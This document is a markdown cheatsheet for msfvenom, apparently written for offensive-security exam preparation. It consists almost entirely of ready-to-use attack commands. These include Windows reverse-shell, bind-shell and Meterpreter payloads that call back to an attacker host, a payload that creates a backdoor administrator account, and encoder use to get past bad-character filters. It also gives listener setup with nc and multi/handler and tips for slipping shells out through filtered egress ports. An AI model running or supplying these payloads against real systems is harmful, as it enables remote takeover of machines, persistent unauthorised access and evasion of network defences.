# msfvenom Cheatsheet (exploit-dev flavored)

## The shape you'll use 90% of the time
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<you> LPORT=<port> \
  -f python -v shellcode -b "\x00\x0a\x0d" EXITFUNC=thread
```
| Flag | Meaning |
|---|---|
| `-p` | payload |
| `-f` | output format (python, c, raw, exe, hex, ps1) |
| `-b` | **bad chars to avoid** — always set this |
| `-v` | variable name in output (default `buf`) |
| `-e` | encoder (e.g. `x86/shikata_ga_nai`) |
| `-i` | encoder iterations |
| `EXITFUNC=thread` | exit cleanly without killing the host process (keeps service alive) |
| `-a x86 --platform windows` | force arch/platform if autodetect is off |

## Payloads worth memorizing
```bash
# Reverse shell (catch with nc -lvnp):
-p windows/shell_reverse_tcp LHOST=IP LPORT=443

# Bind shell:
-p windows/shell_bind_tcp LPORT=4444

# Meterpreter reverse (catch with multi/handler):
-p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443

# Just run a command / calc (great for PoC that you have code exec):
-p windows/exec CMD=calc.exe
-p windows/exec CMD='cmd /c net user hacker Passw0rd! /add'

# Add admin user PoC:
-p windows/adduser USER=pwn PASS=Passw0rd!
```

## Formats
```bash
-f python        # b"\xfc\x48..."  paste into exploit
-f c             # unsigned char buf[] = ...
-f hex           # flat hex
-f raw > sc.bin  # raw bytes to file (for loaders / custom staging)
-f exe > s.exe   # standalone
```

## Handling bad chars & encoders
```bash
# Exclude badchars AND encode to dodge them:
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 \
  -f python -b "\x00\x0a\x0d\x25\x26" -e x86/shikata_ga_nai -i 3
```
- If msfvenom says "no encoder succeeded" your badchar set is too aggressive or the
  payload can't avoid them → reduce badchars or hand-roll.
- Encoded shellcode needs room to decode (writes near its own start). Add NOP padding /
  a stack adjust ahead of it.

## Catch the shell
```bash
# Simple reverse:
nc -lvnp 443
rlwrap nc -lvnp 443           # nicer line editing

# Meterpreter / staged:
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/meterpreter/reverse_tcp; \
  set LHOST IP; set LPORT 443; set ExitOnSession false; run -j"
```

## Quick sanity checks
```bash
# How big is it?
msfvenom ... -f raw | wc -c

# Verify no badchars slipped in (python):
python3 -c "sc=b'\xfc...'; bad=b'\x00\x0a\x0d'; print([hex(c) for c in sc if c in bad])"
# empty list = clean
```

## Exam tips
- Prefer `EXITFUNC=thread` so a failed/finished payload doesn't crash the service and
  you can retry without restarting the target.
- Keep LPORT to common allowed ports (443/53) if egress is filtered.
- Generate once, hardcode into your `.py`; don't regenerate each run (base of encoded
  payload can differ, wasting debug time).
